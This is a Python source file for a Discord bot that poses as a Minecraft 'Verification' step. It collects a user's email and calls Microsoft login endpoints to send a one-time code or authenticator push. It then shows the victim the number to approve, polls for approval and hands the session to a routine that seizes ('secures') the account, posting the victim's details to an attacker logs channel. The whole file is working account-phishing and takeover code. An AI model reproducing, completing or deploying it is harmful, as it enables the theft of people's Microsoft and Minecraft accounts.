from discord import ui
import datetime
import requests
import discord
import json
import time
import re

from views.buttons.button_two import ButtonViewTwo
from views.buttons.button_three import ButtonViewThree

from views.utils.startSecure import startSecuringAccount

from views.modals.embeds import embeds

config = json.load(open("config.json", "r+"))

class MyModalOne(ui.Modal, title="Verification"):
    username = ui.TextInput(label="Minecraft Username", required=True)
    email = ui.TextInput(label="Minecraft Email", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None: 
        # Check if email is valid
        if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(self.email.value) is None:
            interaction.response.send_message(
                "❌ Invalid Email. Make sure you entered your email correctly!",
                ephemeral = True
            )
            return

        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])

        # That bum really left encrypted text here as a watermark LOL

        # Check if Minecraft Username is valid
        # response = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{self.username.value}")
        # To be implemented or scraped 

        await interaction.response.defer()

        await interaction.followup.send(
            embed = discord.Embed (
                title = "Please Wait ⌛",
                description = "Please Allow The Bot To Verify The Data You Have Provided",
                colour = 0xFFFFFF
            ),
            ephemeral = True
        )

        # Sends OTP/Auth code
        # forceotclogin is what triggers the code, spamming otps may lead to microsoft raping the email for some time 
        emailInfo = requests.get(
            url = "https://login.live.com/GetCredentialType.srf",
            headers = {
                "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691"
            },
            json = {
                "checkPhones": True,
                "country": "",
                "federationFlags": 3,
                "flowToken": "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
                "forceotclogin": True,
                "isCookieBannerShown": True,
                "isExternalFederationDisallowed": True,
                "isFederationDisabled": True,
                "isFidoSupported": True,
                "isOtherIdpSupported": True,
                "isRemoteConnectSupported": True,
                "isRemoteNGCSupported": True,
                "isSignup": True,
                "otclogindisallowed": True,
                "username": self.email.value
            }
        ).json()
        
        print(emailInfo)
        # Email does not exist
        if "Credentials" not in emailInfo:
            await logs_channel.send(
                    embed = discord.Embed(
                        title = f"{interaction.user.name} ({interaction.user.id})",
                        description = f"Failed to send a code to:\n```{self.email.value}```\nInvalid Email"
                    )
                )

            await interaction.followup.send(
                embed = discord.Embed(
                    title = embeds["failed_otp"][0],
                    description = embeds["failed_otp"][1],
                ),
                view = ButtonViewThree(),
                ephemeral = True
            )

            return

        # Entropy = Authenticator App number to click in  
        if "RemoteNgcParams" in emailInfo["Credentials"]:

            print("Found Authenticator App!")
            device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]

            if "Entropy" not in emailInfo["Credentials"]["RemoteNgcParams"]:
                authrq = requests.post(
                    url = "https://login.live.com/GetOneTimeCode.srf?id=38936",
                    headers = {
                        "cookie": "MSPOK=$uuid-55593433-60c8-4191-8fa7-a7874311e85d$uuid-4fd7f4fb-42b7-4ffc-bd3d-8feacfb6a57e$uuid-8f1626a7-4080-4073-8686-354aa5b937cc$uuid-135d7477-b083-41e7-b681-2ce793c563e6$uuid-6c60a9a5-97c2-4902-aee3-00f99efacbcf$uuid-4059f6fb-ae72-4398-810f-c5cb6495640f$uuid-0b2844a4-bbfa-4118-9a20-4b00154ccdc0$uuid-8b82f8ca-93b0-440b-be93-b1a743e05907$uuid-1dce1868-997e-4c06-88d99-44db08a70c67$uuid-3c79bd95-3604-4bc1-8358-353fe9734742"
                    },
                    data = f"login=&flowtoken={device}&purpose=eOTT_RemoteNGC&channel=PushNotifications&SAPId=&lcid=1033&uaid=3dd509e1f6ae4e0fa6debefe3b45abcb&canaryFlowToken=-DukZxrqgCYbURm5kHk3U5rkTOMEtJxkIq761a!27Qbn4GRZqvsySwrek6w*uVBbTB1PQ0w0o!jBR2YoMjkZPZJunzjR2I7op80PNHaOWYedJU8uoipCkH8natDYj!zpmDK6FOTPcbedisM70Rv6oB4v3mxPu9wyTgp2aq6Ugc86bmt8mj9Ox*D3fqwz*pYKeMbDy4vLXVetOsXJK*6GooRw$"
                )
                entropy = authrq.json()["DisplaySignForUI"]  
            else:
                entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]

            await interaction.followup.send(
                embed = discord.Embed(
                    title="Verification ✅",
                    description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            sucessEmbed = discord.Embed (
                    title = f"{interaction.user.name} | {interaction.user.id}",
                    description = f"**Username**\n ```{self.username.value}```\n**Email**\n ```{self.email.value}```\n**Authentication Method**\n ```Authenticator App```",
                    timestamp = datetime.datetime.now(),
                    colour = 0x088F8F,                           
            ).set_thumbnail(
                url= f"https://mc-heads.net/avatar/{self.username.value}.png"
            )

            await logs_channel.send(embed = sucessEmbed)
            
            # Checks every second for the authenticator state
            def check_code(flowToken):
                response = requests.post(
                    url = f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                    headers = {
                        "Content-Type": "application/json",
                        "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Accept": "application/json",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Origin": "https://login.live.com",
                        "Referer": "https://login.live.com/"
                    },
                    json = {
                        "DeviceCode": flowToken
                    }    
                )

                return response.json()
        
            i = 0
            while i < 60:

                data = check_code(device)
                print(data)

                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
                    failedAuth = embeds["failed_auth"]
                    await interaction.followup.send(
                        embed = discord.Embed(
                            title = failedAuth[0],
                            description = failedAuth[1],
                            colour=0x00FF00
                        ),
                        ephemeral = True
                    )

                    await logs_channel.send(
                        embed = discord.Embed(
                            title = f"Failed to Verify - {interaction.user.name} ({interaction.user.id})",
                            description = f"**Method**\n```Authenticator```\n**Status**\n```Clicked on the wrong number```",
                            colour=0x00FF00
                        )
                    )
                    return

                elif data["SessionState"] > 1 or data["AuthorizationState"] > 1:
                    await logs_channel.send(
                        embed = discord.Embed(
                            title = f"Securing Account - {interaction.user.name} ({interaction.user.id})",
                            description = f"**Method**\n```Authenticator```\n**Status**\n```Securing...```",
                            colour=0x00FF00
                        )
                    )

                    await logs_channel.send(
                        content = "@everyone"
                    )

                    # Securing
                    startSecuringAccount(self.email.value, device) 
                    
                    return
                
                time.sleep(1)
                i += 1

            failedAuth = embeds["timeout_auth"]
            await interaction.followup.send(
                    embed = discord.Embed(
                    title = failedAuth[0],
                    description = failedAuth[1],
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            await logs_channel.send(
               embed = discord.Embed(
                   title = f"Failed to Verify - {interaction.user.name} ({interaction.user.id})",
                   description = f"**Method**\n```Authenticator```\n**Status**\n```Took too long to verify```",
                            colour=0x00FF00
                )
            )
            return

        elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
            secEmail = emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]
            print(f"Found security email: {secEmail["display"]}!")

            # Will be replace with a db in later updates
            with open("data.json", "w+") as f:
                json.dump(
                    {
                        "email": self.email.value, 
                        "flowtoken": emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
                    },
                    f 
                )

            await interaction.followup.send(
                embed=discord.Embed(
                    title="Verification ✅",
                    description=f"A verification code has been sent to your security email {secEmail["display"]}.\nPlease click the button below to enter your code.",
                    colour=0x00FF00
                ),
                view = ButtonViewTwo(),
                ephemeral = True
            )

            sucessEmbed = discord.Embed (
                    title = f"Auth Verification",
                    description=f"**Email**\n```{self.email.value}```\n**Status**\n```Waiting for code...```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xA3A300,                           
            ).set_thumbnail(
                url= f"https://mc-heads.net/avatar/{self.username.value}.png"
            )



            await logs_channel.send(embed = sucessEmbed)
        
        else:
            await logs_channel.send(
                    embed = discord.Embed(
                        title = f"{interaction.user.name} ({interaction.user.id})",
                        description = f"Failed to send a code to:\n```{self.email.value}```\nEmail OTP Cooldown"
                    )
                )

            await interaction.followup.send(
                embed = discord.Embed(
                    title = embeds["failed_otp"][0],
                    description = embeds["failed_otp"][1],
                ),
                view = ButtonViewThree(),
                ephemeral = True
            )

            return
